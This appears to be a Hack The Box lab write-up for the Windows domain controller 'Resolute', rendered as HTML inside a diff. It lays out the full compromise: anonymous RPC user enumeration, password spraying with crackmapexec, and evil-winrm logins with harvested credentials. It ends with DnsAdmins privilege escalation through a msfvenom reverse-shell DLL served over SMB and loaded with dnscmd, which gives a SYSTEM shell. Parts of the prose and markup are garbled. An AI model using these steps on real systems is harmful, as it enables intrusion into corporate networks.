@@ -1,0 +1,419 @@
+I"T}<h2 id="enumeration">Enumeration</h2>
+<p><strong>Command</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td> --><td class="rouge-code"><pre>nmap -sC -sV 10.10.10.169 -
+### Nmap Scan
+</pre></td></tr></tbody></table></code></pre></div></div>
+<h1 id="nmap-793-scan-initiated-fri-dec-23-125907-2022-as-nmap--sc--sv--on-nmap-scan-101010169">Nmap 7.93 scan initiated Fri Dec 23 12:59:07 2022 as: nmap -sC -sV -oN nmap-scan 10.10.10.169</h1>
+<p>Nmap scan report for 10.10.10.169
+Host is up (0.27s latency).
+Scanned at 2022-12-23 12:59:07 EAT for 519s
+Not shown: 986 closed tcp ports (conn-refused)
+PORT      STATE    SERVICE      VERSION
+53/tcp    open     tcpwrapped
+88/tcp    open     kerberos-sec Microsoft Windows Kerberos (server time: 2022-12-23 10:14:05Z)
+135/tcp   open     msrpc        Microsoft Windows RPC
+139/tcp   open     netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp   open     ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
+445/tcp   open     microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
+464/tcp   open     kpasswd5?
+593/tcp   open     ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp   open     tcpwrapped
+1083/tcp  filtered ansoft-lm-1
+3168/tcp  filtered poweronnud
+3268/tcp  open     ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
+3269/tcp  open     tcpwrapped
+32769/tcp filtered filenet-rpc
+Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows</p>
+
+<p>Host script results:
+|<em>clock-skew: mean: 2h47m01s, deviation: 4h37m10s, median: 6m59s
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|</em>  message_signing: required
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2022-12-23T10:14:26
+|_  start_date: 2022-12-23T10:04:30
+| p2p-conficker: 
+|   Checking for Conficker.C or higher…
+|   Check 1 (port 54592/tcp): CLEAN (Couldn’t connect)
+|   Check 2 (port 52471/tcp): CLEAN (Couldn’t connect)
+|   Check 3 (port 55070/udp): CLEAN (Timeout)
+|   Check 4 (port 43874/udp): CLEAN (Failed to receive data)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: Resolute
+|   NetBIOS computer name: RESOLUTE\x00
+|   Domain name: megabank.local
+|   Forest name: megabank.local
+|   FQDN: Resolute.megabank.local
+|_  System time: 2022-12-23T02:14:27-08:00</p>
+
+<p>Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</p>
+<h1 id="nmap-done-at-fri-dec-23-130746-2022--1-ip-address-1-host-up-scanned-in-51916-seconds">Nmap done at Fri Dec 23 13:07:46 2022 – 1 IP address (1 host up) scanned in 519.16 seconds</h1>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td> --><td class="rouge-code"><pre>The result above shows that is Windows machine with Domain Controller. 
+### User Enumeration
+To enumerate users the tool known as `rpcclient` can be used with the following syntax
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>┌──(gemstone㉿hashghost)-[~/…/htb/Machines/vip/resolute]
+└─$ rpcclient -U ‘’ -N  10.10.10.169</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>**Result**
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>rpcclient $&gt; enumdomusers
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[DefaultAccount] rid:[0x1f7]
+user:[ryan] rid:[0x451]
+user:[marko] rid:[0x457]
+user:[sunita] rid:[0x19c9]
+user:[abigail] rid:[0x19ca]
+user:[marcus] rid:[0x19cb]
+user:[sally] rid:[0x19cc]
+user:[fred] rid:[0x19cd]
+user:[angela] rid:[0x19ce]
+user:[felicia] rid:[0x19cf]
+user:[gustavo] rid:[0x19d0]
+user:[ulf] rid:[0x19d1]
+user:[stevie] rid:[0x19d2]
+user:[claire] rid:[0x19d3]
+user:[paulo] rid:[0x19d4]
+user:[steve] rid:[0x19d5]
+user:[annette] rid:[0x19d6]
+user:[annika] rid:[0x19d7]
+user:[per] rid:[0x19d8]
+user:[claude] rid:[0x19d9]
+user:[melanie] rid:[0x2775]
+user:[zach] rid:[0x2776]
+user:[simon] rid:[0x2777]
+user:[naoki] rid:[0x2778]
+rpcclient $&gt;</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>To extract and have valid user we can use the following command
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>┌──(gemstone㉿hashghost)-[~/…/Machines/vip/resolute/creds]
+└─$ cat users -n | awk -F [ ‘{print $2}’ | awk -F ] ‘{print $1}’ &gt; users.txt</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>This will result to the followings
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Administrator
+Guest
+krbtgt
+DefaultAccount
+ryan
+marko
+sunita
+abigail
+marcus
+sally
+fred
+angela
+felicia
+gustavo
+ulf
+stevie
+claire
+paulo
+steve
+annette
+annika
+per
+claude
+melanie
+zach
+simon
+naoki</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>Check less information about users
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>rpcclient $&gt; querydispinfo                                                                                        <br />
+index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail      Name: (null)    Desc: (null)
+index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
+index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela       Name: (null)    Desc: (null)
+index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette      Name: (null)    Desc: (null)                      <br />
+index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika       Name: (null)    Desc: (null)                       <br />
+index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire       Name: (null)    Desc: (null)
+index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude       Name: (null)    Desc: (null)
+index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null)    Desc: A user account managed by the system.
+index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia      Name: (null)    Desc: (null)                       <br />
+index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred Name: (null)    Desc: (null)      <br />
+index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
+index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo      Name: (null)    Desc: (null)                       <br />
+index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
+index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus       Name: (null)    Desc: (null)                      <br />
+index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak       Desc: Account created. Password set to Welcome123!
+index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie      Name: (null)    Desc: (null)
+index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki        Name: (null)    Desc: (null)
+index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo        Name: (null)    Desc: (null)
+index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per  Name: (null)    Desc: (null)
+index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan  Name: Ryan Bertrand     Desc: (null)
+index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally        Name: (null)    Desc: (null)
+index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon        Name: (null)    Desc: (null)
+index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve        Name: (null)    Desc: (null)
+index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie       Name: (null)    Desc: (null)
+index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita       Name: (null)    Desc: (null)
+index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf  Name: (null)    Desc: (null)
+index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach Name: (null)    Desc: (null)</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>Try the credentials with `crackmapexec` to see if we can login
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>┌──(gemstone㉿hashghost)-[~/…/htb/Machines/vip/resolute]
+└─$ crackmapexec smb 10.10.10.169 -u ‘marco’  -p ‘Welcome123!’                                                                                                                                                                       <br />
+SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\marco:Welcome123! STATUS_LOGON_FAILURE</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td> --><td class="rouge-code"><pre>The user `marco` did not work with the password `Welcome123!` but since we have a list of users then we can brute-force them to see if there is any lucky.
+
+**Command**
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>┌──(gemstone㉿hashghost)-[~/…/Machines/vip/resolute/creds]
+└─$ crackmapexec smb 10.10.10.169 -u users.txt -p ‘Welcome123!’</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>**Result**
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Administrator:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Guest:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\krbtgt:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\DefaultAccount:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\ryan:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\sunita:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\abigail:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\marcus:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\sally:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\fred:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\angela:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\felicia:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\gustavo:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\ulf:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\stevie:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\claire:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\paulo:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\steve:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\annette:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\annika:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\per:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\claude:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\melanie:Welcome123!</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td> --><td class="rouge-code"><pre>This password is valid to user `melanie`
+### User Account
+We can check if this user can login into the machine via `winrm` service 
+
+**Command**
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>┌──(gemstone㉿hashghost)-[~/…/Machines/vip/resolute/creds]
+└─$ crackmapexec winrm 10.10.10.169 -u melanie -p ‘Welcome123!’</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>**Result**
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>SMB         10.10.10.169    5985   RESOLUTE         [<em>] Windows 10.0 Build 14393 (name:RESOLUTE) (domain:megabank.local)
+HTTP        10.10.10.169    5985   RESOLUTE         [</em>] http://10.10.10.169:5985/wsman
+WINRM       10.10.10.169    5985   RESOLUTE         [+] megabank.local\melanie:Welcome123! (Pwn3d!)</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td> --><td class="rouge-code"><pre>Then user `melanie` can login through `wnrm` then we can use `evil-winrm` to login.
+
+**Command**
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>┌──(gemstone㉿hashghost)-[~/…/Machines/vip/resolute/creds]
+└─$ evil-winrm -i 10.10.10.169 -u melanie -p ‘Welcome123!’</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>**Result**
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p><em>Evil-WinRM</em> PS C:\Users\melanie\Documents&gt; whoami
+megabank\melanie</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>**User flag**
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p><em>Evil-WinRM</em> PS C:\Users\melanie\desktopgc user.txt
+cb2ce78be54a22bb4567ba469e7b023d</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td> --><td class="rouge-code"><pre>### Privilege Escalation.
+This user does not have anything interesting but we can enumerate the file system, starting with the `C:\ root`. To list files we can use `Get-ChildItem -H` command or `dir -force` 
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p><em>Evil-WinRM</em> PS C:\users\melanie\appdata\local\temp&gt; cd /</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>After listing the hidden file can be seen then we can check the `PSTranscripts` directory to see what does it have.
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p><em>Evil-WinRM</em> PS C:&gt; gci -H</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>Directory: C:\
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Mode                LastWriteTime         Length Name
+—-                ————-         —— —-
+d–hs-       12/23/2022   5:52 AM                $RECYCLE.BIN
+d–hsl        9/25/2019  10:17 AM                Documents and Settings
+d–h–        9/25/2019  10:48 AM                ProgramData
+d–h–        12/3/2019   6:32 AM                PSTranscripts
+d–hs-        9/25/2019  10:17 AM                Recovery
+d–hs-        9/25/2019   6:25 AM                System Volume Information
+-arhs-       11/20/2016   5:59 PM         389408 bootmgr
+-a-hs-        7/16/2016   6:10 AM              1 BOOTNXT
+-a-hs-       12/23/2022   2:04 AM      402653184 pagefile.sys</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>Navigate into the directory and list all hidden files within it.
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p><em>Evil-WinRM</em> PS C:\PSTranscripts&gt; cd 20191203                                                                                                                                                                                            <br />
+<em>Evil-WinRM</em> PS C:\PSTranscripts\20191203&gt; dir                                                                                                                                                                                           <br />
+<em>Evil-WinRM</em> PS C:\PSTranscripts\20191203&gt; dir -force</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>Directory: C:\PSTranscripts\20191203
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Mode                LastWriteTime         Length Name
+—-                ————-         —— —-
+-arh–        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>There is a `.txt` file meaning we can read it to see if there is any valuable information.
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p><em>Evil-WinRM</em> PS C:\PSTranscripts\20191203&gt; type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td> --><td class="rouge-code"><pre>**Result**
+There is a bunch of information but the only interesting line is shown below which shows the password and new user called `ryan`
+</pre></td></tr></tbody></table></code></pre></div></div>
+<blockquote>
+  <blockquote>
+    <p>ParameterBinding(Invoke-Expression): name=”Command”; value=”cmd /c net use X: \fs01\backups ryan Serv3r4Admin4cc123!</p>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td> --><td class="rouge-code"><pre>## Administrator Account
+Check if this credentials are valid with `crackmapexec` 
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+    <p>┌──(gemstone㉿hashghost)-[~/…/htb/Machines/vip/resolute]
+└─$ crackmapexec winrm 10.10.10.169 -u ryan -p ‘Serv3r4Admin4cc123!’
+SMB         10.10.10.169    5985   RESOLUTE         [<em>] Windows 10.0 Build 14393 (name:RESOLUTE) (domain:megabank.local)
+HTTP        10.10.10.169    5985   RESOLUTE         [</em>] http://10.10.10.169:5985/wsman
+WINRM       10.10.10.169    5985   RESOLUTE         [+] megabank.local\ryan:Serv3r4Admin4cc123! (Pwn3d!)</p>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>Then this credentials are valid and we can try to use them to login with `evil-winrm`
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+    <p>┌──(gemstone㉿hashghost)-[~/…/Machines/vip/resolute/exploit]
+└─$ evil-winrm -i 10.10.10.169 -u ryan -p ‘Serv3r4Admin4cc123!’</p>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>**Result**
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+    <p><em>Evil-WinRM</em> PS C:\Users\ryan\Documents&gt; whoami 
+megabank\ryan</p>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>Checking groups for user `ryan`
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+    <p><em>Evil-WinRM</em> PS C:\Users\ryan\Documents&gt; whoami /groups</p>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>**Result**
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+    <p>GROUP INFORMATION
+—————–</p>
+  </blockquote>
+</blockquote>
+
+<p>Group Name                                 Type             SID                                            Attributes
+========================================== ================ ============================================== ===============================================================
+Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
+MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td> --><td class="rouge-code"><pre>User `ryan` is a member of `Contractors` and `DnsAdmins`. Members of the `DnsAdmins` group have access to network `DNS` information. The default permissions are Allow: Read, Write, Create All Child objects, Delete Child objects, Special Permissions. According to [hackingarticles](https://www.hackingarticles.in/windows-privilege-escalation-dnsadmins-to-domainadmin/), The Microsoft Team designing `DNS` integration decided to make the Domain Controller a `DNS` server by default. To manage that `DNS` service a group was created by the name of `DnsAdmins`. Then came the ability for the users of `DnsAdmins` to run code with elevated privileges that in their eyes was a feature.
+### Exploitation
+In desktop directory there is a note which shows that this machine is reverted after one minute if there will be any changes.  
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p><em>Evil-WinRM</em> PS C:\Users\ryan\Desktop&gt; type note.txt
+Email to team:</p>
+
+<ul>
+  <li>due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within 1 minute
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td> --><td class="rouge-code"><pre>To exploit i used the [hackingarticles](https://www.hackingarticles.in/windows-privilege-escalation-dnsadmins-to-domainadmin/sc) document to follow through.
+1. Create a `dll` by using `msfvenom`
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+    <p>┌──(gemstone㉿hashghost)-[~/…/htb/Machines/vip/resolute/exploit]
+└─$ msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=1234 -f dll &gt; privesc.dll</p>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>2. Use `smbserver` from `impacket` to host the current path `.` as shown below
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+    <p>┌──(gemstone㉿hashghost)-[~/…/Machines/vip/resolute/exploit]
+└─$ impacket-smbserver -smb2support share .
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation</p>
+  </li>
+</ul>
+
+<p>[<em>] Config file parsed
+[</em>] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[<em>] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[</em>] Config file parsed
+[<em>] Config file parsed
+[</em>] Config file parsed</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>3. Since there is always a chance that any Malware Scanner or Defender to detect the file and either quarantine it or remove it. Hence, we are hosting it on the `smb` server that makes it available for the Windows machine, and then we will directly interact with the `DDL` over the network. The executable we will use to pass the `DLL` code into the memory as SYSTEM is called `dnscmd.exe`. This step has been performed in step number 2 then now pass the following commands in your windows machine
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p><em>Evil-WinRM</em> PS C:\Users\ryan\desktop&gt; dnscmd.exe /config /serverlevelplugindll \10.10.14.5\share\rev.dll
+<em>Evil-WinRM</em> PS C:\Users\ryan\desktop&gt; sc.exe stop dns
+<em>Evil-WinRM</em> PS C:\Users\ryan\desktop&gt; sc.exe start dns</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>4. The connection must be established 
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>RESOLUTE$::MEGABANK:aaaaaaaaaaaaaaaa:75dd298f46c982584f82e803627ad3b8:0101000000000000000a6466ee16d901e42c3fcfa265443e0000000001001000540058004e006c00500077006d00590003001000540058004e006c00500077006d00590002001000730069007a007a005100550064007a0004001000730069007a007a005100550064007a0007000800000a6466ee16d90106000400020000000800300030000000000000000000000000400000591a36925b0a4d5199cbb350892e75b7fc82d9a645973712b86a39c350d642db0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0035000000000000000000
+[<em>] Connecting Share(1:share)
+[</em>] Disconnecting Share(1:share)
+[<em>] Closing down connection (10.10.10.169,51523)
+[</em>] Remaining connections []</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>5. Start a listener for 
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>┌──(gemstone㉿hashghost)-[~/…/htb/Machines/vip/resolute]                                                                                                                                                                                 <br />
+└─$ nc -nlvp 1234<br />
+c:\Windows\System&gt;whoami
+whoami
+nt authority\system</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td> --><td class="rouge-code"><pre>Then up to here we have a shell as `system` user
+
+**Root flag**
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>c:\Users\Administrator\Desktop&gt;type root.txt
+type root.txt
+43dccd03906eb65c66cc2f4fdafd909e</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
